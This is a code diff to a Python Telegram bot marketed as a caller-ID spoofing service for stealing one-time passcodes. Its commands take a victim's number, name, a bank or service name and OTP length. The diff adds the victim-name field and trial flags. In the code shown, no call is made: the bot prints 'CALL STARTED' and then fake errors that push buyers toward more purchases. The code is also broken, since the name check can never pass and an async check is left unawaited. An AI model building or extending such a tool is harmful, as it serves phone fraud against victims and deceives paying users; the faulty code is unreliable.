@@ -58,31 +58,43 @@ def set_expired_date(user_id,plan):
     if get_user_info(user_id,'date')=='N/A':
         if plan == '1hour':
             expire_date = now+timedelta(hours=1)
+            set_user_value(user_id,'trial',True)
         elif plan == '1day':
             expire_date = now+timedelta(days=1)
+            set_user_value(user_id,'trial',False)
         elif plan == '1week':
             expire_date = now+timedelta(days=7)
+            set_user_value(user_id,'trial',False)
         elif plan == '1month':
             expire_date = now+timedelta(days=30)
+            set_user_value(user_id,'trial',False)
     elif datetime.strptime(get_user_info(user_id,'date'), "%Y-%m-%d %H:%M:%S.%f") < now:
         if plan == '1hour':
             expire_date = now+timedelta(hours=1)
+            set_user_value(user_id,'trial',True)
         elif plan == '1day':
             expire_date = now+timedelta(days=1)
+            set_user_value(user_id,'trial',False)
         elif plan == '1week':
             expire_date = now+timedelta(days=7)
+            set_user_value(user_id,'trial',False)
         elif plan == '1month':
             expire_date = now+timedelta(days=30)
+            set_user_value(user_id,'trial',False)
     elif datetime.strptime(get_user_info(user_id,'date'), "%Y-%m-%d %H:%M:%S.%f") > now:
         old_date = datetime.strptime(get_user_info(user_id,'date'), "%Y-%m-%d %H:%M:%S.%f")
         if plan == '1hour':
             expire_date = old_date+timedelta(hours=1)
+            set_user_value(user_id,'trial',True)
         elif plan == '1day':
             expire_date = old_date+timedelta(days=1)
+            set_user_value(user_id,'trial',False)
         elif plan == '1week':
             expire_date = old_date+timedelta(days=7)
+            set_user_value(user_id,'trial',False)
         elif plan == '1month':
             expire_date = old_date+timedelta(days=30)
+            set_user_value(user_id,'trial',False)
     set_user_value(user_id,'date',str(expire_date))
 
 
@@ -94,6 +106,18 @@ async def is_user_in_channel(bot: Bot, user_id):
         return member.status in [ChatMemberStatus.MEMBER, ChatMemberStatus.CREATOR, ChatMemberStatus.ADMINISTRATOR] and member1.status in [ChatMemberStatus.MEMBER, ChatMemberStatus.CREATOR, ChatMemberStatus.ADMINISTRATOR]
     except:
         return True
+    
+
+#is name valid
+async def is_name_valid(name):
+    i = 0
+    test = True
+    while test and i<len(name):
+        if 'A' <= name[i] <= 'Z' and 'a' <= name[i] <= 'z':
+            i+=1
+        else:
+            test=False
+    return test
     
 
 #START
@@ -381,20 +405,22 @@ async def send_local_video(message: Message):
                     now = datetime.now()
                     expire_date = datetime.strptime(get_user_info(user_id,'date'), "%Y-%m-%d %H:%M:%S.%f")
                     if now < expire_date:
-                        args = message.text.split(maxsplit=4)
-                        if len(args)<4:
-                            await message.answer("❌ You have to enter 4 arguments, /call [victim_number] [spoof_number] [service_name] [digitlenght]")
+                        args = message.text.split(maxsplit=5)
+                        if len(args)<6:
+                            await message.answer("❌ You have to enter 5 arguments, /call [victim_number] [spoof_number] [victim_name] [service_name] [digitlenght]")
                         else:
                             victim=args[1]
                             number=args[2]
-                            if victim.isdecimal() and 6<=len(victim)<=15 and number.isdecimal() and 6<=len(number)<=15 and args[4].isdecimal():
+                            name = args[3]
+                            if victim.isdecimal() and 6<=len(victim)<=15 and number.isdecimal() and 6<=len(number)<=15 and args[5].isdecimal() and is_name_valid(name):
                                 if get_user_info(user_id,'IP'):
                                     sleep(1)
                                     await message.answer("""🔥 CALL STARTED 
         📲 VICTIM NUMBER : """+victim+"""
         📞 CALLER ID : """+number+"""
-        🏦 SERVICE NAME : """+args[3]+"""
-        ⚙️ OTP DIGITS: """+args[4])
+        🏦 SERVICE NAME : """+args[4]+"""
+        👤 victim NAME : """+name+"""
+        ⚙️ OTP DIGITS: """+args[5])
                                     sleep(8)
                                     if not (get_user_info(user_id,'trial')): 
                                         await message.answer("""❌ ERROR[301]
@@ -409,8 +435,10 @@ async def send_local_video(message: Message):
                                     await message.answer("❌ ERROR [501]\n\n⚠️ Sorry, we facing a problem in your account, your IP adresse was banned from telegram sorry you can't redeem the key, you have to buy a virtual IP adresse to redeem your key.\n\nContact the support for help.",reply_markup=keyboard1)
                             elif not(victim.isdecimal() and 6<=len(victim)<=15 and number.isdecimal() and 6<=len(number)<=15):
                                 await message.answer("❌ You have to type a valid phone number.")
-                            elif not(args[4].isdecimal()):
+                            elif not(args[5].isdecimal()):
                                 await message.answer("❌ The digits must be between 4 and 8")
+                            elif not(is_name_valid(name)):
+                                await message.answer("❌ The victim name contain only characters.")
                     else:
                         await message.answer("❌ Your subscribe was expired.\nYou have to buy a new key.",reply_markup=keyboard1)
             elif get_user_info(user_id,'date') =='N/A':
@@ -443,26 +471,38 @@ async def prebuilt_commands(message: Message):
                     now = datetime.now()
                     expire_date = datetime.strptime(get_user_info(user_id,'date'), "%Y-%m-%d %H:%M:%S.%f")
                     if now < expire_date:
-                        args = message.text.split(maxsplit=2)
-                        if len(args)<3:
-                            await message.answer("You have to enter 2 arguments, "+args[0]+" [victim_number] [digitlenght]")
+                        args = message.text.split(maxsplit=3)
+                        if len(args)<4:
+                            await message.answer("You have to enter 3 arguments, "+args[0]+" [victim_number] [victim_name] [digitlenght]")
                         else:
                             victim=args[1]
-                            if victim.isdecimal() and 6<=len(victim)<=15 and args[2].isdecimal():
-                                sleep(1)
-                                await message.answer("""🔥 CALL STARTED 
-    📲 VICTIM NUMBER : """+victim+"""
-    📞 CALLER ID : 7800667788
-    ⚙️ OTP DIGITS: """+args[2])
-                                sleep(8)
-                                if not (get_user_info(user_id,'trial')): 
-                                    await message.answer("❌ ERROR[302]\n\nSorry you can't make a call because your country doesen't support the spoofing.\nContact the support for help.",reply_markup=keyboard)
+                            name=args[2]
+                            if victim.isdecimal() and 6<=len(victim)<=15 and args[3].isdecimal() and is_name_valid(name):
+                                if get_user_info(user_id,'IP'):
+                                    sleep(1)
+                                    await message.answer("""🔥 CALL STARTED 
+        📲 VICTIM NUMBER : """+victim+"""
+        👤 VICTIM NAME: """+name+"""
+        📞 CALLER ID : 7800667788
+        ⚙️ OTP DIGITS: """+args[3])
+                                    sleep(8)
+                                    if not (get_user_info(user_id,'trial')): 
+                                        await message.answer("""❌ ERROR[301]
+ 
+⚠ Your region has srtict caller ID policies, spoofing is banned or restricted.
+ The call from your region is too expensive.
+ 
+ Contact support for help.""",reply_markup=keyboard)
+                                    else:
+                                        await message.answer("❌ You are in trial mode you can't make a call.\nYou have to buy a subscription.",reply_markup=keyboard)
                                 else:
-                                    await message.answer("❌ You are in trial mode you can't make a call.\nYou have to buy a subscription.",reply_markup=keyboard)
+                                   await message.answer("❌ ERROR [501]\n\n⚠️ Sorry, we facing a problem in your account, your IP adresse was banned from telegram sorry you can't redeem the key, you have to buy a virtual IP adresse to redeem your key.\n\nContact the support for help.",reply_markup=keyboard1) 
                             elif not(victim.isdecimal() and 6<=len(victim)<=15):
-                                await message.answer("You have to type a valid phone number.")
-                            elif not(args[4].isdecimal()):
-                                await message.answer("The digits must be between 4 and 8")
+                                await message.answer("❌ You have to type a valid phone number.")
+                            elif not(args[3].isdecimal()):
+                                await message.answer("❌ The digits must be between 4 and 8.")
+                            elif not(is_name_valid(name)):
+                                await message.answer("❌ The victim name contain only characters.")
                     else:
                         await message.answer("Your subscribe was expired.\nYou have to buy a new key.",reply_markup=keyboard1)
             elif get_user_info(user_id,'date') =='N/A':
